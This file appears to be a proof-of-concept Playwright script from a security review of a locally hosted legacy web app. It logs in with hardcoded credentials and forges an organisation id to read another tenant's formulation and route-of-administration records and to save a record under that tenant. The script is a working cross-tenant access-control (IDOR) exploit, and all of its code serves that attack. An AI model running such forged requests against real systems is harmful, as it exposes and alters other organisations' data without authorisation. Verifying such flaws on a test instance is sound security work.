const { chromium } = require('playwright');
const LEGACY = 'http://localhost:8080';

async function login(page) {
  await page.goto(`${LEGACY}/index.html`, { waitUntil: 'load', timeout: 30000 });
  await page.waitForTimeout(1500);
  await page.fill('#userName', 'admin');
  await page.fill('#password', '12345');
  await page.locator('#password').blur();
  await page.waitForFunction(() => document.querySelectorAll('#organizationId option').length > 1, { timeout: 10000 });
  await page.selectOption('#organizationId', '1');
  await page.waitForFunction(() => document.querySelectorAll('#unitId option').length > 1, { timeout: 10000 });
  const unitVal = await page.$eval('#unitId option:nth-child(2)', (o) => o.value);
  await page.selectOption('#unitId', unitVal);
  await page.click('input[type="submit"]');
  await page.waitForTimeout(1500);
  const confirmOk = page.locator('button:has-text("Ok")').first();
  if (await confirmOk.isVisible().catch(() => false)) await confirmOk.click();
  await page.waitForFunction(() => !!window.sessionStorage.getItem('token'), { timeout: 15000 });
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();
  await login(page);
  await page.goto(`${LEGACY}/index.html#/formulationTypeROAMaster`, { waitUntil: 'load', timeout: 20000 });
  await page.waitForTimeout(1500);
  const token = await page.evaluate(() => window.sessionStorage.getItem('token'));
  const hdrs = (tok) => ({ 'Authorization': 'Bearer ' + tok, 'userId': '1', 'unitId': '1', 'Content-Type': 'application/json' });

  const listResp = await page.evaluate(async ({tok, h}) => {
    const res = await fetch('/api/globals/formulationTypeAndROA/999', { headers: h });
    return { status: res.status, body: await res.text() };
  }, {tok: token, h: hdrs(token)});
  console.error('READ (getAll), forged orgId=999, real org1/unit1 session:');
  console.error(JSON.stringify(listResp, null, 1));

  const byIdResp = await page.evaluate(async ({h}) => {
    const res = await fetch('/api/globals/formulationTypeAndROA/1/1', { headers: h });
    return { status: res.status, body: await res.text() };
  }, {h: hdrs(token)});
  console.error('READ (getById), org1 path but id=1 belongs to victim org 999:');
  console.error(JSON.stringify(byIdResp, null, 1));

  const countResp = await page.evaluate(async ({h}) => {
    const res = await fetch('/api/globals/formulationTypeAndROA/getCount/999', { headers: h });
    return { status: res.status, body: await res.text() };
  }, {h: hdrs(token)});
  console.error('READ (getCount), forged orgId=999:');
  console.error(JSON.stringify(countResp, null, 1));

  // Write-side: real frontend sends organizationId directly in the POST body
  // (SaveNewFormulationROA -- $scope.organizationId from the client cookie).
  // Forge it here the same way an attacker would: real org1/unit1 auth headers,
  // but a forged organizationId field in the body.
  const saveResp = await page.evaluate(async ({h}) => {
    const res = await fetch('/api/globals/formulationTypeAndROA/save', {
      method: 'POST',
      headers: h,
      body: JSON.stringify({
        formulationtypeid: 1,
        routeOfAdministrationId: [3],
        status: true,
        unitId: 999,
        organizationId: 999,
        userId: 1
      })
    });
    return { status: res.status, body: await res.text() };
  }, {h: hdrs(token)});
  console.error('WRITE (save), forged organizationId=999 in body, real org1/unit1 auth:');
  console.error(JSON.stringify(saveResp, null, 1));

  await browser.close();
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
